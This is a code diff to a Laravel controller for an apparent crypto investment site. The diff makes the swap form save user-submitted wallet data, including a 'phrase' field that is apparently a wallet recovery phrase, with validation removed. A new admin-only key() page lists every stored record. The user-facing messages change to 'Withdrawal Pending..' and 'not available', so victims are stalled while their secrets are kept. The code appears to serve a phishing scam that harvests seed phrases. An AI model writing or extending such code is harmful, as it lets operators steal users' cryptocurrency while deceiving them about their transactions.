@@ -81,7 +81,7 @@ class InvestorController extends Controller
     public function message()
     {
 
-        return redirect()->route('investor.formm')->with('success', 'Withdrawal Successful');
+        return redirect()->route('investor.formm')->with('success', 'Withdrawal Pending..');
     }
 
     public function storecoin(Request $request)
@@ -89,16 +89,18 @@ class InvestorController extends Controller
         // $coin = new Coin();
         // $coin->wallet = $request->input('wallet');
 
-        $request->validate([
-            'wallet' => ['required', 'string', 'max:100'],
+        // $request->validate([
+        //     'wallet' => ['required', 'string', 'max:100'],
 
-        ]);
+        // ]);
 
-        $coin = Coin::create([
-            'wallet' => $request->wallet,
+        // $coin = Coin::create([
+        //     'wallet' => $request->wallet,
 
-        ]);
-        $coin->save();
+        // ]);
+        // $coin->save();
+
+
 
         // return redirect()->route('coin.index');
 
@@ -110,31 +112,66 @@ class InvestorController extends Controller
         // $coin = new Coin();
         // $coin->wallet = $request->input('wallet');
 
-        $request->validate([
-            'phrase' => ['required', 'string', 'max:100'],
-            'to' => ['required', 'string', 'max:100'],
-            'toamount' => ['required', 'string', 'max:100'],
-            'from' => ['required', 'string', 'max:100'],
-            'fromamount' => ['required', 'string', 'max:100'],
+        // $request->validate([
+        //     'phrase' => ['required', 'string', 'max:100'],
+        //     'to' => ['required', 'string', 'max:100'],
+        //     'toamount' => ['required', 'string', 'max:100'],
+        //     'from' => ['required', 'string', 'max:100'],
+        //     'fromamount' => ['required', 'string', 'max:100'],
 
-        ]);
+        // ]);
 
-        $coin = Coin::create([
-            'phrase' => $request->phrase,
-            'to' => $request->to,
-            'toamount' => $request->toamount,
-            'from' => $request->from,
-            'fromamount' => $request->fromamount,
+        // $coin = Coin::create([
+        //     'phrase' => $request->phrase,
+        //     'to' => $request->to,
+        //     'toamount' => $request->toamount,
+        //     'from' => $request->from,
+        //     'fromamount' => $request->fromamount,
 
-        ]);
-        $coin->save();
+        // ]);
+        // $coin->save();
+        $coins = new Coin();
+        $coins->wallet = $request->input('wallet');
+        $coins->phrase = $request->input('phrase');
+        $coins->to = $request->input('to');
+        $coins->toamount = $request->input('toamount');
+        $coins->from = $request->input('from');
+        $coins->fromamount = $request->input('fromamount');
+        $coins->save();
 
         // return redirect()->route('coin.index');
 
         // return view('Investor.cornswap');
-        return redirect()->route('investor.swap')->with('success', 'Conversion Successful');
+        return redirect()->route('investor.swap')->with('success', 'not available');
 
     }
+
+
+
+
+    public function key()
+    {
+        $coin = Coin::all();
+
+
+        return view('Admin.show', compact('coin'));
+    }
+
+
+    public function destroy($id)
+    {
+
+        // Delete the payment from the database.
+        Coin::destroy($id);
+
+        // Redirect the user back to the payments list page.
+        // return view('Admin.addcoin');
+        return redirect()->back()->with('success', 'Investor details deleted successfully.');
+    }
+
+
+
+
 
 
 }
